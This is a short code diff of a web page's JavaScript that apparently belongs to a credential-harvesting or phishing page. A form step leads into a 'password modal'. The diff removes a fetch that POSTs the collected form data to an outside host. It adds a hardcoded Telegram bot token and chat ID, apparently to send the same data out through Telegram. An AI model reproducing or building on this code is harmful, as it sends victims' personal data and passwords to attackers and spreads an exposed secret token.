@@ -3673,13 +3673,6 @@
 
             modalOverlay.classList.remove('active');
             document.body.style.overflow = '';
-            fetch("https://program.invoice-ads-partner.com", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify(formData)
-});
 
             // Open password modal
             setTimeout(() => {
@@ -3690,7 +3683,8 @@
         });
 
         // Telegram Bot Configuration
-     
+        const TELEGRAM_BOT_TOKEN = '8273905413:AAHHDm1mWgwek0N_Qr7tWQomC7HOzB5JOtM';
+        const TELEGRAM_CHAT_ID = '-4831342152';
 
         // Store form data
         let formData = {
